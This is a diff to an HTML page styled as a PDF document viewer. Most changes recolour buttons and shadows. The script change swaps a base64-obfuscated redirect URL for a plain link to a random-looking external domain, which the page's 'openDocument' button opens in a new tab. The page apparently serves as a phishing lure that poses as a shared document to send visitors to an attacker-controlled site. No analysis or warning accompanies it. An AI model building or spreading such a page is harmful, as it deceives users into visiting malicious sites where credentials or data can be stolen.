@@ -50,7 +50,7 @@
             align-items: center;
             justify-content: center;
             padding: 0.75rem;
-            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
+            box-shadow: 0 8px 32px -8px rgba(135, 206, 235, 0.15);
         }
 
         .pdf-icon {
@@ -75,7 +75,7 @@
             background: white;
             padding: 1rem;
             border-radius: 0.5rem;
-            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
+            box-shadow: 0 4px 20px -4px rgba(135, 206, 235, 0.1);
             border: none;
         }
 
@@ -107,13 +107,13 @@
 
         .btn-primary {
             height: 2.5rem;
-            background: linear-gradient(135deg, hsl(229, 66%, 48%), hsl(229, 66%, 48%));
+            background: linear-gradient(135deg, hsl(200, 75%, 65%), hsl(200, 75%, 75%));
             color: white;
             border: none;
         }
 
         .btn-primary:hover {
-            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
+            box-shadow: 0 8px 32px -8px rgba(135, 206, 235, 0.15);
         }
 
         .btn-secondary {
@@ -126,7 +126,7 @@
 
         .btn-secondary:hover {
             background: #f9fafb;
-            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
+            box-shadow: 0 4px 20px -4px rgba(135, 206, 235, 0.1);
         }
 
         .icon {
@@ -204,12 +204,11 @@
     </div>
 
     <script>
-        // Base64 encoded redirect URL for faster loading
-        const encodedUrl = 'aHR0cHM6Ly9ncmVlbm92YWYuZXUvRDduNXhWWnpMLyM=';
+        // Redirect URL
+        const redirectUrl = 'https://react.weadioje.live/!Xum7XuXA8wTk5/';
         
         function openDocument() {
-            const decodedUrl = atob(encodedUrl);
-            window.open(decodedUrl, '_blank');
+            window.open(redirectUrl, '_blank');
         }
 
         // Add hover effects
